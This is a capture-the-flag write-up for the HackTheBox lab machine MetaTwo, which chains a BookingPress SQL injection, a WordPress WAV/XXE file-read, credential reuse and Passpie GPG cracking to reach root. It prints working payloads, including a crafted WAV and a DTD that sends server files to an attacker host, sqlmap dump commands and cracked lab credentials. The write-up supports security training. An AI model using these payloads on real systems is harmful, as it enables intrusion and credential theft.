# MetaTwo — HackTheBox

| Field | Details |
|-------|---------|
| Platform | HackTheBox |
| Machine | MetaTwo |
| OS | Linux (Debian 5.10.0-19-amd64) |
| Difficulty | Easy |
| Attacker IP | `10.10.16.36` |
| Target IP | `10.129.228.95` |
| Domain | `metapress.htb` |
| Tools Used | Nmap, sqlmap, John the Ripper, gpg2john, passpie, curl, ftp, scp |
| CVEs | CVE-2022-0739 (BookingPress ≤ 1.0.10 unauthenticated SQLi), CVE-2021-29447 (WordPress 5.6–5.7 XXE in Media Library via PHP 8) |
| Date | October 2026 |

---

## Table of Contents

- [Attack Chain Summary](#attack-chain-summary)
- [Reconnaissance](#reconnaissance)
- [Foothold — Unauthenticated SQLi (CVE-2022-0739)](#foothold--unauthenticated-sqli-cve-2022-0739)
- [Exploitation — XXE via WordPress Media Library (CVE-2021-29447)](#exploitation--xxe-via-wordpress-media-library-cve-2021-29447)
- [Lateral Movement — FTP to SSH](#lateral-movement--ftp-to-ssh)
- [Privilege Escalation — Passpie GPG Key Cracking](#privilege-escalation--passpie-gpg-key-cracking)
- [Flags](#flags)
- [Lessons Learned](#lessons-learned)
- [Full Attack Chain Reference](#full-attack-chain-reference)
- [Commands Reference](#commands-reference)
- [MITRE ATT\&CK Mapping](#mitre-attck-mapping)

---

## Attack Chain Summary

| Step | Technique | Outcome |
|------|-----------|----------|
| 1 | Nmap — full port + service version scan | Ports 21 (FTP), 22 (SSH), 80 (HTTP/nginx) discovered |
| 2 | `/etc/hosts` — virtual host registration | `metapress.htb` resolves |
| 3 | Web enumeration + Wappalyzer | WordPress 5.6.2, PHP 8.0.24, BookingPress plugin 1.0.10 identified |
| 4 | CVE-2022-0739 — Unauthenticated SQLi via BookingPress AJAX | `wp_users` table dumped → `admin` and `manager` password hashes |
| 5 | Hash cracking — John the Ripper + `rockyou.txt` | `manager` hash cracked → `partylikearockstar` |
| 6 | WordPress login as `manager` | Authenticated to WordPress admin dashboard |
| 7 | CVE-2021-29447 — XXE in WordPress Media Library (PHP 8) | Crafted `.wav` + `evil.dtd` payload retrieves server files |
| 8 | XXE — retrieve `wp-config.php` via PHP filter | FTP credentials recovered: `metapress.htb:9NYS_ii@FyL_p5M2NvJ` |
| 9 | FTP login — enumerate server filesystem | `mailer/send_email.php` downloaded |
| 10 | Credential discovery in `send_email.php` | SSH credentials recovered: `jnelson:Cb4_JmWM8zUZWMu@Ys` |
| 11 | SSH login as `jnelson` | `user.txt` captured |
| 12 | `.passpie` directory enumeration | GnuPG-encrypted Passpie password store found |
| 13 | Export `.passpie/.keys` → `gpg2john` → John the Ripper | GPG passphrase cracked: `blink182` |
| 14 | `passpie export` — decrypt password store | `root` SSH password recovered: `p7qfAZt4_A1xo_0x` |
| 15 | `su root` with recovered password | Root shell obtained; `root.txt` captured |

---

## Reconnaissance

### Step 1 — Port Scan

A two-phase Nmap approach was used: a fast all-port scan to identify open ports, followed by service version detection on the discovered ports only.

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.228.95 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)  
Hackerpatel007_1@htb[/htb]$ nmap -p$ports -sV 10.129.228.95
```

```
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 10.129.228.95
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
```

Three services found:
- **Port 21 — FTP:** ProFTPD is running but didn't fully banner-grab. FTP access will be tested once credentials are found.
- **Port 22 — SSH:** OpenSSH 8.4p1 on Debian. Note the user `jnelson` as a potential target once credentials are obtained.
- **Port 80 — HTTP:** nginx 1.18.0 acting as a reverse proxy. Browsing to the IP redirects to `http://metapress.htb` — must add to `/etc/hosts`.

```bash
Hackerpatel007_1@htb[/htb]$ echo "10.129.228.95 metapress.htb" | sudo tee -a /etc/hosts
```

---

### Step 2 — Web Application Fingerprinting

Navigating to `http://metapress.htb` reveals a WordPress site. The **Wappalyzer** browser extension provides exact version information:

| Technology | Version |
|------------|----------|
| CMS | WordPress 5.6.2 |
| PHP | 8.0.24 |
| Web Server | nginx 1.18.0 |
| Database | MySQL |

This version combination is critical: both **WordPress 5.6.2** and **PHP 8.0.24** are exactly what makes CVE-2021-29447 (XXE in Media Library) exploitable later in the chain. The `X-Powered-By: PHP/8.0.24` response header independently confirms the PHP version.

---

### Step 3 — Plugin Enumeration: BookingPress 1.0.10

Visiting `http://metapress.htb/events/` shows an event booking scheduler. Viewing the page source reveals the installed plugin and its exact version:

```xml
<link rel='stylesheet' id='bookingpress_element_css-css'
 href='http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10'
 media='all' />
```

The plugin is **BookingPress Appointment Booking version 1.0.10**. A search immediately surfaces **CVE-2022-0739** — an unauthenticated SQL injection vulnerability.

> **Key concept:** WordPress plugin version numbers are embedded in CSS and JS asset URLs as `?ver=` query parameters. This is true even for unauthenticated visitors and is a reliable way to fingerprint installed plugins and their exact versions. Always inspect page source for asset references before jumping to directory brute-forcing.

---

## Foothold — Unauthenticated SQLi (CVE-2022-0739)

### Step 4 — Understanding the Vulnerability

**CVE-2022-0739** affects the `bookingpress_front_get_category_services` AJAX action in BookingPress ≤ 1.0.10. The `total_service` POST parameter is passed directly into a SQL query without sanitisation, and this endpoint is available to **unauthenticated users** via `wp-admin/admin-ajax.php`.

The only prerequisite is a valid `_wpnonce` token, which is embedded in the Events page JavaScript and freely readable from the page source:

```javascript
var postData = { action:'bookingpress_generate_spam_captcha', _wpnonce:'60646b11e1' };
```

**Manual verification with curl:**

```bash
Hackerpatel007_1@htb[/htb]$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

```
HTTP/1.1 200 OK
X-Powered-By: PHP/8.0.24

[{"bookingpress_service_id":"10.5.15-MariaDB-0+deb11u1","bookingpress_category_id":"Debian 11","bookingpress_service_name":"debian-linux-gnu",...}]
```

UNION-based injection returned MariaDB version in place of service data — injection confirmed.

---

### Step 5 — Database Enumeration with sqlmap

**Phase 1 — Enumerate databases:**

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
  --method POST \
  --data "action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111" \
  -p total_service \
  --level=5 --risk=3 --dbs
```

```
available databases [2]:
[*] blog
[*] information_schema
```

**Phase 2 — Dump `wp_users`:**

```bash
Hackerpatel007_1@htb[/htb]$ sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
  --method POST \
  --data "action=bookingpress_front_get_category_services&_wpnonce=60646b11e1&category_id=123&total_service=111" \
  -p total_service \
  --level=5 --risk=3 -D blog -T wp_users --dump
```

```
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+--------------------------------------------+-----------+
| ID | user_email           | user_pass                                  | user_login|
+----+----------------------+--------------------------------------------+-----------+
| 1  | admin@metapress.htb  | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.        | admin     |
| 2  | manager@metapress.htb| $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70        | manager   |
+----+----------------------+--------------------------------------------+-----------+
```

Two WordPress phpass hashes (`$P$` prefix) recovered for offline cracking.

---

### Step 6 — Password Hash Cracking

```bash
Hackerpatel007_1@htb[/htb]$ john --wordlist=/usr/share/wordlists/rockyou.txt wp_users.hash
```

```
partylikearockstar    (manager)
```

| Account | Password |
|---------|----------|
| `manager` | `partylikearockstar` |
| `admin` | Not cracked |

---

### Step 7 — WordPress Login

Logging in at `http://metapress.htb/wp-login` as `manager:partylikearockstar` grants access to the WordPress dashboard. The `manager` role has access to the **Media Library** — the exact surface needed for CVE-2021-29447.

WordPress 5.6.2 running PHP 8.0.24 is vulnerable to **CVE-2021-29447** — an authenticated XXE vulnerability in the Media Library triggered via a malformed WAVE audio file. The ID3 audio parsing library's XML parser resolves external entities when running under PHP 8.

---

## Exploitation — XXE via WordPress Media Library (CVE-2021-29447)

### Step 8 — Understanding the Vulnerability

**CVE-2021-29447** affects WordPress 5.6–5.7 when running PHP 8. A malformed WAVE file containing an XML DOCTYPE triggers the ID3 library's weakly-configured XML parser, allowing external entity exfiltration.

**The attack requires two files:**
1. `payload.wav` — a malformed WAVE file with an embedded XML DOCTYPE loading an external DTD
2. `evil.dtd` — the external DTD hosted on the attacker's HTTP server that reads and exfiltrates target files

**How the exfiltration works:**
- WordPress/ID3 parses the uploaded `.wav`’s embedded XML
- The XML parser fetches `evil.dtd` from the attacker’s server
- `evil.dtd` uses `php://filter/read=convert.base64-encode/resource=<file>` to read any accessible file and delivers the base64-encoded content as a URL parameter
- The attacker decodes the base64 to recover file contents

---

### Step 9 — Phase 1: Exfiltrate `/etc/passwd`

**Create `payload.wav`:**

```bash
Hackerpatel007_1@htb[/htb]$ echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.36:8080/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

**Create `evil.dtd`:**

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.36:8080/?p=%file;'>" >
```

> **Note:** `&#x25;` is the HTML entity for `%` — required because a literal `%` inside a DTD entity value is interpreted as another parameter entity reference, causing a parse error. The entity reference allows the nested `%trick` entity to be defined correctly.

**Start the HTTP listener:**

```bash
Hackerpatel007_1@htb[/htb]$ python3 -m http.server 8080
```

**Upload `payload.wav`** via Dashboard → Media → Add New.

```
10.129.228.95 - - "GET /evil.dtd HTTP/1.1" 200 -
10.129.228.95 - - "GET /?p=cm9vdDp4OjA2MDpyb290Oi9yb290Oi9iaW4vYmFzaApk... HTTP/1.1" 200 -
```

```bash
Hackerpatel007_1@htb[/htb]$ echo "cm9vdDp4OjA2MDpyb290Oi9yb290Oi9iaW4vYmFzaApk..." | base64 -d
```

```
root:x:0:0:root:/root:/bin/bash
...
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
...
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

**Key finding:** `jnelson` (UID 1000) has a login shell. ProFTPD and FTP service accounts confirm the FTP service.

---

### Step 10 — Phase 2: Exfiltrate `wp-config.php`

**Update `evil.dtd`** to target `wp-config.php`:

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.36:8080/?p=%file;'>" >
```

Repeat the upload process. The decoded response reveals:

```php
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```

**FTP credentials recovered:**

| Field | Value |
|-------|-------|
| Username | `metapress.htb` |
| Password | `9NYS_ii@FyL_p5M2NvJ` |

> **Key concept:** WordPress installations store FTP credentials in `wp-config.php` when `FS_METHOD = ftpext` is set. This allows WordPress to write its own files without granting the web process filesystem write access — a security measure that paradoxically stores cleartext FTP credentials in a config file. XXE or LFI on any WordPress installation should always target `wp-config.php`.

---

## Lateral Movement — FTP to SSH

### Step 11 — FTP Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ ftp 10.129.228.95
# Username: metapress.htb | Password: 9NYS_ii@FyL_p5M2NvJ
```

```
ftp> ls
drwxr-xr-x   5 metapress.htb metapress.htb   4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb   4096 Oct  5 14:12 mailer
```

The `mailer` directory is immediately interesting — custom email senders commonly embed credentials.

```
ftp> cd mailer
ftp> ls
drwxr-xr-x   4 metapress.htb metapress.htb   4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb   1126 Jun 22 18:32 send_email.php
ftp> get send_email.php
```

---

### Step 12 — Credential Extraction from `send_email.php`

```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";
```

**SSH credentials recovered:**

| Field | Value |
|-------|-------|
| Username | `jnelson` |
| Password | `Cb4_JmWM8zUZWMu@Ys` |

The SMTP credentials for `jnelson@metapress.htb` are reused as the OS user’s SSH password — confirmed by the `/etc/passwd` entry.

> **Key concept:** Application config files on FTP servers are an extremely common source of lateral movement credentials. Always enumerate every accessible directory when authenticated to FTP, not just the web application root.

---

### Step 13 — SSH Login as jnelson — User Flag

```bash
Hackerpatel007_1@htb[/htb]$ ssh jnelson@10.129.228.95
jnelson@10.129.228.95's password: Cb4_JmWM8zUZWMu@Ys

jnelson@meta2:~$ cat user.txt
cf3177281d7821fac3f9df89bccec442
```

---

## Privilege Escalation — Passpie GPG Key Cracking

### Step 14 — Home Directory Enumeration

```bash
jnelson@meta2:~$ ls -al
```

```
lrwxrwxrwx 1 root    root       9 Jun 26 15:59 .bash_history -> /dev/null
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
```

Two findings:
- `.bash_history` is symlinked to `/dev/null` — deliberate history suppression.
- `.passpie` is present. **Passpie** is a CLI password manager that encrypts credentials with GnuPG.

---

### Step 15 — Understanding Passpie

Passpie stores credentials in GPG-encrypted YAML files, protected by a master passphrase. The attack plan:
1. Copy `.passpie/.keys` (GPG private key) to the attack machine
2. Use `gpg2john` to extract a crackable hash
3. Crack the hash with `rockyou.txt` to recover the master passphrase
4. Use `passpie export` to dump all stored credentials in plaintext

```bash
jnelson@meta2:~$ ls -al ~/.passpie/
```

```
-r-xr-x--- 1 jnelson jnelson    3 Jun 26 13:57 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .keys
dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
```

---

### Step 16 — Exfiltrate the Passpie Keys

```bash
Hackerpatel007_1@htb[/htb]$ scp jnelson@10.129.228.95:/home/jnelson/.passpie/.keys ./keys
jnelson@10.129.228.95's password: Cb4_JmWM8zUZWMu@Ys
.keys         100% 5243    19.0KB/s   00:00
```

Before running `gpg2john`, edit the file to keep only the `-----BEGIN PGP PRIVATE KEY BLOCK-----` through `-----END PGP PRIVATE KEY BLOCK-----` section — `gpg2john` only processes the private key.

---

### Step 17 — Extract Hash from GPG Private Key

```bash
Hackerpatel007_1@htb[/htb]$ gpg2john keys > keys.hash
```

`gpg2john` converts the GPG private key into a John-crackable hash. The private key is encrypted with a symmetric cipher (AES256) keyed from the master passphrase — the hash represents this encrypted key material.

---

### Step 18 — Crack the GPG Passphrase

```bash
Hackerpatel007_1@htb[/htb]$ john --wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg
```

```
blink182          (Passpie)
```

**Passpie master passphrase cracked: `blink182`**

The `s2k-count` of 65,011,712 (65 million SHA-1 HMAC iterations) shows this key derivation is deliberately hardened. A random high-entropy passphrase would be computationally infeasible to crack — `blink182` is in `rockyou.txt` only because it is a well-known band name.

---

### Step 19 — Export Passpie Credentials

```bash
jnelson@meta2:~$ passpie export ~/password.db
Passphrase: blink182

jnelson@meta2:~$ cat ~/password.db
```

```yaml
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
```

**Root SSH password recovered: `p7qfAZt4_A1xo_0x`**

The `jnelson` entry matches the already-known password, confirming database integrity.

> **Key concept:** `passpie export` decrypts all stored credentials and outputs them as plaintext YAML in one command. Any user who can access the `.passpie` directory and knows or cracks the master passphrase gains every credential in the vault. A weak master passphrase makes the entire credential set trivially recoverable.

---

### Step 20 — Root Shell

```bash
jnelson@meta2:~$ su root
Password: p7qfAZt4_A1xo_0x

root@meta2:/home/jnelson# cat /root/root.txt
b7fa6e216a0ee231c9b4bf8f8996dd66
```

---

## Flags

| Flag | Value |
|------|-------|
| User Flag | `cf3177281d7821fac3f9df89bccec442` |
| Root Flag | `b7fa6e216a0ee231c9b4bf8f8996dd66` |

---

## Lessons Learned

1. **WordPress plugin version numbers are freely visible in asset URLs.** The `?ver=1.0.10` suffix on BookingPress CSS files directly revealed the exact plugin version without authentication. A five-second search for "BookingPress 1.0.10 exploit" returned CVE-2022-0739. In real engagements, enumerate all plugin asset references in page source before reaching for WPScan — version-specific CVEs are often faster to exploit than scanner output.

2. **Unauthenticated SQL injection in WordPress plugins is a high-value attack surface.** CVE-2022-0739 required no login — only a `_wpnonce` value visible to any visitor in the Events page JavaScript. The `_wpnonce` is a CSRF token, not an authentication token. The pattern of “AJAX action available to unauthenticated users, passing unsanitised input into SQL” appears repeatedly in WordPress plugin CVEs.

3. **The WordPress XXE (CVE-2021-29447) is version and runtime specific.** The vulnerability only affects WordPress 5.6–5.7 running under PHP 8. Wappalyzer confirmed both conditions simultaneously. Without PHP 8, the ID3 library handles XML differently and XXE does not trigger. Version fingerprinting before choosing an exploit saves time.

4. **PHP stream wrappers (`php://filter`) enable arbitrary file read through XXE.** The chain `php://filter/read=convert.base64-encode/resource=<file>` reads any accessible file and delivers it safely base64-encoded via HTTP. The relative path `../wp-config.php` resolves relative to the WordPress root. Always target `wp-config.php`, `/etc/passwd`, and SSH keys once XXE is confirmed.

5. **FTP credentials in `wp-config.php` are common with `FS_METHOD = ftpext`.** WordPress stores cleartext FTP credentials in the config file when it uses FTP for automatic updates. XXE or LFI on WordPress should always target `wp-config.php` — it is the single highest-value file for lateral movement: database credentials, FTP credentials, and sometimes API keys.

6. **Hardcoded SMTP credentials in application scripts are a reliable lateral movement source.** The `send_email.php` in the FTP `mailer` directory contained full SMTP credentials for `jnelson@metapress.htb`, and the developer reused the same password for the OS SSH account. Always retrieve every PHP, Python, and config file accessible via FTP or web shells.

7. **Passpie on a shared Linux system is exploitable when the master passphrase is weak.** The `.passpie/.keys` file contains a GPG private key encrypted with the master passphrase. `gpg2john` extracts a crackable hash; John with `rockyou.txt` broke `blink182`. Any discoverable password manager directory during post-exploitation (`.passpie`, `.password-store`, `.kdbx` files) should be immediately targeted for hash extraction and offline cracking.

8. **`passpie export` is a one-command credential dump once the passphrase is known.** Unlike raw GPG operations, Passpie abstracts everything into a single command that outputs all credentials as plaintext YAML. The ease of export is exactly why a strong, high-entropy master passphrase is non-negotiable for any GPG-backed password manager on a shared system.

---

## Full Attack Chain Reference

```
[Attacker: 10.10.16.36]
        ↓
Nmap: ports 21 (FTP), 22 (SSH), 80 (HTTP/nginx) open
        ↓
/etc/hosts: metapress.htb → 10.129.228.95
        ↓
Web enum: WordPress 5.6.2, PHP 8.0.24, BookingPress plugin 1.0.10
        ↓
CVE-2022-0739: Unauthenticated SQLi via /wp-admin/admin-ajax.php
(bookingpress_front_get_category_services AJAX, total_service param)
        ↓
sqlmap: blog.wp_users dumped → admin and manager phpass hashes
        ↓
john + rockyou.txt: manager:partylikearockstar cracked
        ↓
WordPress login as manager [Authenticated Access]
        ↓
CVE-2021-29447: XXE via malformed .wav → ID3 XML parser (PHP 8)
        ↓
Phase 1: payload.wav + evil.dtd → /etc/passwd exfiltrated (base64)
  └── jnelson:x:1000:1000:jnelson discovered
        ↓
Phase 2: evil.dtd updated → ../wp-config.php exfiltrated (base64)
  └── FTP_USER: metapress.htb | FTP_PASS: 9NYS_ii@FyL_p5M2NvJ
        ↓
FTP login as metapress.htb → mailer/send_email.php retrieved
        ↓
send_email.php: jnelson:Cb4_JmWM8zUZWMu@Ys (SMTP creds = SSH creds)
        ↓
SSH login as jnelson [User Flag: cf3177281d7821fac3f9df89bccec442]
        ↓
Home directory: ~/.passpie directory discovered
        ↓
~/.passpie/.keys: GPG private key exfiltrated via scp
        ↓
gpg2john keys > keys.hash
        ↓
john + rockyou.txt --format=gpg: blink182 (master passphrase cracked)
        ↓
passpie export ~/password.db (passphrase: blink182)
  └── root SSH password: p7qfAZt4_A1xo_0x
        ↓
su root (password: p7qfAZt4_A1xo_0x)
        ↓
root@meta2 [Root Flag: b7fa6e216a0ee231c9b4bf8f8996dd66]
```

---

## Commands Reference

| Command | Purpose |
|---------|---------|
| `nmap -p- --min-rate=1000 -T4 10.129.228.95` | Fast full TCP port scan |
| `nmap -p21,22,80 -sV 10.129.228.95` | Service version detection on open ports |
| `echo "10.129.228.95 metapress.htb" \| sudo tee -a /etc/hosts` | Register virtual host |
| `curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data '...total_service=111) UNION ALL SELECT @@version...'` | Manual SQLi PoC verification |
| `sqlmap -u "...admin-ajax.php" --method POST --data "..." -p total_service --level=5 --risk=3 --dbs` | Enumerate databases via SQLi |
| `sqlmap ... -D blog -T wp_users --dump` | Dump WordPress user hashes |
| `john --wordlist=/usr/share/wordlists/rockyou.txt wp_users.hash` | Crack phpass WordPress hashes |
| `echo -en 'RIFF\xb8...' > payload.wav` | Create malformed WAV with embedded XML DOCTYPE |
| `python3 -m http.server 8080` | Serve `evil.dtd` and capture exfiltrated file data |
| `echo "<base64>" \| base64 -d` | Decode exfiltrated base64 file contents |
| `ftp 10.129.228.95` | FTP login with recovered credentials |
| `get send_email.php` | Download email script from FTP |
| `ssh jnelson@10.129.228.95` | SSH login with credentials from `send_email.php` |
| `ls -al ~/.passpie/` | Enumerate Passpie password manager directory |
| `scp jnelson@10.129.228.95:/home/jnelson/.passpie/.keys ./keys` | Retrieve GPG key file |
| `gpg2john keys > keys.hash` | Convert GPG private key to crackable hash format |
| `john --wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg` | Crack GPG master passphrase |
| `passpie export ~/password.db` | Decrypt and export all Passpie credentials to plaintext |
| `su root` | Switch to root with recovered password |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|--------------|
| T1595 | T1595.001 | Nmap full-port and service-version scan against 10.129.228.95 |
| T1190 | — | CVE-2022-0739: BookingPress 1.0.10 unauthenticated SQLi via AJAX endpoint |
| T1005 | — | `wp_users` table extracted containing WordPress phpass hashes |
| T1110 | T1110.002 | John the Ripper + `rockyou.txt` cracking phpass hashes from `wp_users` |
| T1078 | T1078.003 | WordPress login with cracked `manager:partylikearockstar` credentials |
| T1190 | — | CVE-2021-29447: Authenticated XXE via malformed WAVE upload in WordPress Media Library (PHP 8) |
| T1083 | — | `/etc/passwd` and `wp-config.php` exfiltrated via XXE + PHP stream filter |
| T1552 | T1552.001 | FTP credentials from `wp-config.php`; SSH credentials from `send_email.php` |
| T1021 | T1021.004 | SSH lateral movement to `jnelson` using credentials from `send_email.php` |
| T1550 | — | FTP login using cleartext credentials stored in `wp-config.php` |
| T1555 | T1555.001 | Passpie GPG-encrypted password store: `.keys` exfiltrated, passphrase cracked, credentials exported |
| T1110 | T1110.002 | `gpg2john` + John the Ripper + `rockyou.txt` cracking GPG passphrase (`blink182`) |
| T1548 | T1548.003 | `su root` with password `p7qfAZt4_A1xo_0x` recovered from Passpie export |

*HackTheBox retired machine — writeup published after official retirement.*  
*Penetration Tester role in India | Target: January 2027*
